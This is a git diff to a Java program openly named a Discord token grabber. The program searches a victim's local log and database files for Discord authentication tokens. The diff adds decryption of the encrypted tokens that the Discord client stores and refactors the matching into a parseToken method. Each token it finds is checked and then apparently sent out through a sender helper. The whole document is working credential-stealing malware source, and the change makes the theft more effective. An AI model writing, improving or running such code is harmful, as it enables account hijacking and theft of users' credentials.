@@ -1,7 +1,6 @@
 package com.github.dedinc.discordtokengrabber;
 
 import com.github.dedinc.discordtokengrabber.utils.Helper;
-import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import java.io.BufferedReader;
 import java.io.FileReader;
 import java.nio.charset.StandardCharsets;
@@ -10,6 +9,7 @@ import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Base64;
 import java.util.Calendar;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -45,19 +45,15 @@ public class Main {
                     .limit(100)
                     .forEach(file -> {
                         final String fname = file.toFile().getName();
+                        final String fpath = file.toFile().getAbsolutePath().toLowerCase();
                         if (fname.endsWith(".log") || fname.endsWith(".ldb") || fname.endsWith(".sqlite")) {
                             try {
                                 try (BufferedReader br = new BufferedReader(new FileReader(file.toFile()))) {
                                     String line;
                                     while ((line = br.readLine()) != null) {
-                                        Pattern p = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}");
-                                        Matcher m = p.matcher(line);
-                                        while (m.find()) {
-                                            Long.parseLong(new String(Base64.decode(m.group().split("\\.")[0]), StandardCharsets.UTF_8));
-                                            if (!tokens.contains(m.group())) {
-                                                tokens.add(m.group());
-                                                Helper.getSender().sendMessage(Helper.geChecker().checkUser(m.group()));
-                                            }
+                                        parseToken(line, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}");
+                                        if (fpath.contains("roaming") && fpath.contains("discord")) {
+                                            parseToken(line, "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*");
                                         }
                                     }
                                 }
@@ -65,5 +61,21 @@ public class Main {
                         }
                     });
         } catch (Exception e) {}
+    }
+
+    public static void parseToken(String line, String regex) {
+        Pattern p = Pattern.compile(regex);
+        Matcher m = p.matcher(line);
+        while (m.find()) {
+            String token = m.group();
+            if (m.group().startsWith("dQw4w9WgXcQ")) {
+                token = Helper.getChecker().decryptToken(m.group());
+            }
+            if (!tokens.contains(token)) {
+                Long.parseLong(new String(Base64.getDecoder().decode(token.split("\\.")[0]), StandardCharsets.UTF_8));
+                Helper.getSender().sendMessage(Helper.getChecker().checkUser(token));
+                tokens.add(token);
+            }
+        }
     }
 }
